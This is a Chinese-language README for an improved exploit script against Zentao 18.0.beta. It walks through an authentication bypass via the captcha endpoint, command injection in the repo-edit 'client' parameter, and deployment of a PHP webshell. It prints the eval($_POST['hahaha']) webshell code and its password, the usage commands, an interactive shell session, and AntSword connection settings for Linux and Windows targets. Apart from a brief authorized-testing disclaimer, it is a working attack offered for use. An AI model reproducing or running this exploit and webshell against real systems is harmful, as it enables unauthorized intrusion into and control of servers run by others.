# Zentao RCE 漏洞利用脚本

## 📋 文件说明

- **exp_fixed.py** - 修复后的完整漏洞利用脚本

## 🔧 主要修复内容

### 1. create_repo() - 创建代码库 ✅
- **问题**: 原版函数体为空，只返回True
- **修复**: 完整实现创建代码库逻辑，包括repoID提取

### 2. detect_system() - 系统检测 ✅
- **问题**: 原版硬编码为'linux'
- **修复**: 通过实际命令执行检测系统类型（Linux/Windows）

### 3. deploy_webshell() - 部署Shell ✅
- **问题**: 缺少完整的payload，只有Linux部分支持
- **修复**: 
  - Linux: 3个完整payload（原版只有2个）
  - Windows: 4个完整payload（原版没有）

### 4. gen_random_str() - 随机字符串 ✅
- **新增**: 用于创建代码库时生成随机参数

### 5. 增强功能 ✅
- 添加 `--cookie-only` 参数
- 改进错误处理
- 更详细的日志输出

## 🚀 快速开始

### 基本使用

```bash
# 1. 自动化利用（获取webshell信息）
python3 exp_fixed.py -u http://target.com

# 2. 交互式Shell模式
python3 exp_fixed.py -u http://target.com -i

# 3. 执行单条命令
python3 exp_fixed.py -u http://target.com -c "whoami"

# 4. 仅获取Cookie
python3 exp_fixed.py -u http://target.com --cookie-only
```

### 使用代理

```bash
# Burp Suite代理
python3 exp_fixed.py -u http://target.com -p http://127.0.0.1:8080 -i
```

## 📊 代码对比

| 指标 | 原始版本 | 修复版本 | 改进 |
|------|---------|---------|------|
| 总行数 | 373 | 513 | +140行 |
| 函数数 | 16 | 17 | +1个 |
| create_repo | ❌ 空函数 | ✅ 完整 | 100% |
| detect_system | ❌ 硬编码 | ✅ 动态检测 | 100% |
| Linux Payload | ⚠️ 2个 | ✅ 3个 | +50% |
| Windows支持 | ❌ 无 | ✅ 4个payload | NEW |

## 🎯 漏洞利用流程

```
1. 查找基础URL
   └─> 尝试 / 和 /zentao/ 路径

2. 获取请求类型
   └─> PATH_INFO 或 GET

3. 绕过认证
   └─> 通过captcha接口获取zentaosid

4. 检查代码库
   └─> 判断是否存在代码库

5. 创建代码库 (如需要)
   └─> 创建Gitlab类型仓库
   └─> 提取repoID

6. 检测系统类型
   └─> 执行whoami命令
   └─> 根据返回判断Linux/Windows

7. 部署Webshell
   └─> Linux: mkdir + base64解码创建PHP文件
   └─> Windows: mkdir + move + certutil解码

8. 验证Webshell
   └─> 执行phpinfo()测试
   └─> 返回连接信息
```

## 💻 交互式Shell示例

```bash
$ python3 exp_fixed.py -u http://target.com -i

╔═══════════════════════════════════════════════════════════╗
║     Zentao 18.0.beta RCE Exploit - Complete Edition      ║
║                    Fixed Version                          ║
╚═══════════════════════════════════════════════════════════╝

[INFO] Target: http://target.com
[SUCCESS] Zentao Path: http://target.com/zentao
[INFO] Request Type: PATH_INFO
[SUCCESS] Got Session: a3adde2af35c975f...
[SUCCESS] Repository exists
[INFO] Detecting user: www-data
[SUCCESS] System: LINUX
[SUCCESS] PHP: PHP Version 7.4.30
[SUCCESS] Webshell URL: http://target.com/zentao/dd-checkUpdate

[+] Exploit successful!

=== Interactive Shell ===
URL: http://target.com/zentao/dd-checkUpdate
Password: hahaha
Type 'exit' to quit

shell> whoami
www-data

shell> pwd
/var/www/html/zentao

shell> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

shell> exit
Bye!
```

## 🔗 蚁剑连接配置

成功部署后，可以使用蚁剑连接：

**连接信息：**
```
URL: http://target.com/zentao/dd-checkUpdate
密码: hahaha
请求方式: POST
编码器: default
连接器: default
```

**请求头配置：**
```
Cookie: zentaosid=xxx; lang=zh-cn; device=desktop; theme=default
Referer: http://target.com/zentao/index.php?m=user&f=login&referer=...
X-Requested-With: XMLHttpRequest
```

> 💡 提示: Cookie和Referer会在脚本运行后自动显示

## ⚠️ 重要提示

1. **仅用于授权测试** - 未经授权的渗透测试是违法的
2. **受控环境测试** - 建议在自己的测试环境中验证
3. **获取授权** - 使用前必须获得目标系统所有者的书面授权
4. **遵守法律** - 违规使用可能导致法律责任

## 📚 参考资料

### Webshell PHP代码（Base64解码后）

**Linux版 control.php:**
```php
<?php
class dd extends control
{
    public function checkUpdate($sn = '')
    {
        echo "png#";
        include "demo";
    }
}
?>
```

**demo文件需要创建为:**
```php
<?php
eval($_POST['hahaha']);
?>
```

### 命令注入原理

漏洞点在 `repo-edit` 功能的 `client` 参数：

```
SCM=Subversion&client=whoami||&...
                      ^^^^^^^ 命令注入点
```

- 使用 `||` 实现命令连接
- 通过base64编码绕过过滤
- 利用相对路径 `../dd/` 创建目录

## 🧪 测试验证

运行对比测试：

```bash
python3 test_comparison.py
```

输出示例：
```
╔══════════════════════════════════════════════════════════╗
║        Zentao RCE 脚本修复验证                           ║
╚══════════════════════════════════════════════════════════╝

1. 语法检查
----------------------------------------------------------------------
✅ exp.py - 语法正确
✅ exp_fixed.py - 语法正确

2. 代码对比
----------------------------------------------------------------------
原始文件: 373行, 16个函数
修复文件: 513行, 17个函数

关键函数对比:
  create_repo          | 原始: ✓ | 修复: ✓ | 完整
  detect_system        | 原始: ✓ | 修复: ✓ | 完整
  deploy_webshell      | 原始: ✓ | 修复: ✓ | 完整
  gen_random_str       | 原始: ✗ | 修复: ✓ | 完整
```

## 📝 更新日志

### v2.0 (修复版)
- ✅ 修复 create_repo() 空函数问题
- ✅ 修复 detect_system() 硬编码问题
- ✅ 完善 deploy_webshell() payload
- ✅ 添加 Windows 系统支持
- ✅ 新增 gen_random_str() 函数
- ✅ 新增 --cookie-only 参数
- ✅ 改进错误处理和日志

### v1.0 (原始版)
- 基础漏洞利用功能
- Linux系统部分支持

## 🤝 贡献

基于以下项目学习改进：
- 原始Go版本：0xf4n9x/Zentao-Captcha-RCE
- 改进Go版本：Zentao-GetShell

## 📄 许可

仅供学习研究使用。使用者需自行承担所有法律责任。

---

**最后更新**: 2024-12-09
**版本**: 2.0 (Fixed)
